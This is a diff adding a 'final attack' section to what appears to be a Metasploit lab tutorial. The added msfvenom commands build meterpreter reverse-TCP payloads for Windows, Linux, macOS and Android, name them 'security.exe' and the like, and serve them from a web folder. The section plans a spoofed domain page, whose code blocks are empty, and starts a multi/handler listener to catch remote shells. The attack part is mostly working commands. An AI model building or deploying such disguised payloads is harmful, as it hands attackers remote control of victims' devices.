@@ -14,17 +14,20 @@ Install (_or ensure they are installed_) following packages.
 # update system (optional)
 $ sudo apt update -y && sudo apt upgrade -y
 
+# install optional packages (optional)
+$ sudo apt install -y vim tree
+
 # install needed packages
 $ sudo apt install -y curl nmap
 ```
 
 ## Preparation
 
-For the Metasploit (_first steps_) section, you can create some folders.
+For the Metasploit (_first steps_) section and the Metaslpoit/Msfvenom (_final attack_) sections, you can create already some folders.
 
 ```shell
 # create some directories
-$ mkdir /var/www/html/{images,styles,data}
+$ mkdir /var/www/html/{images,styles,scripts,data}
 ```
 
 ## Install and start Metasploit
@@ -94,5 +97,77 @@ msf6 auxiliary(scanner/http/dir_scanner) > run
 # exit msfconsole
 msf6 auxiliary(scanner/http/dir_scanner) > quit
 ```
+
+## Metaslpoit/Msfvenom (_final attack_)
+
+### Generate some exploits
+
+Okay, let's make the hands dirty.
+
+```shell
+# start msfconsole (without banner)
+$ msfconsole -L
+
+# search for reverse tcp
+msf6 > search meterpreter_reverse_tcp
+
+# create payload for Windows
+msf6 > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe > /var/www/html/data/security.exe
+
+# create payload for Linux
+msf6 > msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > /var/www/html/data/security.elf
+
+# create payload for macOS
+msf6 > msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f macho > /var/www/html/data/security.dmg
+
+# create payload for Android
+msf6 > msfvenom -p android/meterpreter_reverse_tcp -o /var/www/html/data/security.apk LHOST=192.168.0.1 LPORT=4444
+
+# show directory structure (optional)
+msf6 > tree /var/www/html/data/
+├── security.apk
+├── security.dmg
+├── security.elf
+└── security.exe
+```
+
+### Prepare the spoofed domain page
+
+...
+
+```html
+```
+
+...
+
+```css
+```
+
+...
+
+```javascript
+```
+
+### Start connection handler
+
+...
+
+```shell
+# use multi/handler
+msf6 > > use exploit/multi/handler
+
+# show informations (optional)
+msf6 exploit(multi/handler) > info
+
+# show options (optional)
+msf6 exploit(multi/handler) > options
+
+# set lhost
+msf6 exploit(multi/handler) > set LHOST 192.168.0.1
+
+# start multi/handler
+msf6 exploit(multi/handler) > run
+```
+
 
 [Go Back](./README.md)
